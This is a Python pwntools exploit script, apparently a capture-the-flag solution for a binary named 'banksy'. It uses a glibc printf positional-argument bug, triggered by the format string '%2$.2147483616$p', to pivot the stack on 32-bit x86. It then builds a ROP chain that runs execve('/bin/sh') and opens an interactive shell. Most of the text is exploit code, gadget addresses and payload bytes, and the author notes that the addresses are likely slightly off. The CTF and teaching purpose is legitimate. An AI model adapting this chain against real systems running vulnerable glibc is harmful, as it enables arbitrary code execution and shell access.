from pwn import *

# The first thing we have to do to solve this is to find the following file (given in hint eventually):
# https://github.com/bminor/glibc/blob/master/stdio-common/vfprintf-internal.c
# and take a look at the commit messages:
# https://github.com/bminor/glibc/commit/6caddd34bd7ffb5ac4f36c8e036eee100c2cc535#diff-5a23cc90fb9cf1eb9388dc08e7c80c8d629edc0b380b212acb7ed5aaaf4b417b
# We see that there is a BIG BUG being fixed here. Basically, if you call printf with this string:
# "%2$.2147483616$p"
# Printf will undergo a stack pivot on x86 32 bit architectures.

# Now for how the exploit works.
# We get to choose where to stop the program and overwrite.
# We can't stop it at printf_positional's ret, because the stack reverts before then.
# We can stop it at any ret from the time the stack is pivoted (at printf_positional+1709) though.
# The easiest one is at _itoa_word+160 (0x0808c9f0). We can stop there and overwrite the mmapped chunk.
# Theoretically, that chunk should be where the stack is pivoted, meaning once we `ret`, we have hijacking.
# Because the stack pivot is probablistic in nature, we may need to try multiple times.
# The below is a sketch of the exploit with a proof of vulnerability:

binary = "../dist/banksy"
elf = ELF(binary)
target_addr = elf.symbols["_itoa_word"] + 0xA0  # _itoa_word+160 in gdb
printf_payload = "%2$.2147483616$p"

# Gadgets (These addresses are likely slightly off)
syscall = 0x08049BC2  # int 0x80
xoreaxeax = 0x0805FFB0  # xor eax, eax; ret
popeax = 0x080BD4FD  # pop eax; ret
popebx = 0x080481C9  # pop ebx; ret
popjmp = 0x080B0270  # pop edx ; pop ecx ; pop eax ; jmp dword ptr [eax]

# execve("/bin/sh\x00", NULL, NULL); ## Execve = syscall 0xb
# eax -> 0x0b
# ebx -> const char * filename
# ecx -> const char * const * argv
# edx -> const char * const * envp

start_addr = 0x7F900000  # We know the mmap is here

part1 = b""
part1 += p32(popjmp)
part1 += p32(0)
part1 += p32(0)
part1 += p32(start_addr + 4)

part2 = b""
part2 += p32(popeax)
part2 += p32(0x0B)
part2 += p32(popebx)
part2 += p32(start_addr)
part2 += p32(syscall)

chain = b""
chain += b"/bin/sh\x00"  # placed at 0x7f900000
chain += part2
chain += b"\x90" * (0x30 - (len(chain) + len(part1)))
chain += part1
print(chain)

# p = remote('localhost', 1010)
p = process(binary)
p.sendline(chain)  # This chain will likely not work perfectly for you!
# But you get the idea. We ret to a ropchain and we have libc statically compiled, so it should be pretty easy.
p.sendline(str(hex(target_addr)))  # This is where we want to stop at
p.sendline(
    printf_payload
)  # This is the "exploit" string that makes printf do the thing
p.interactive()
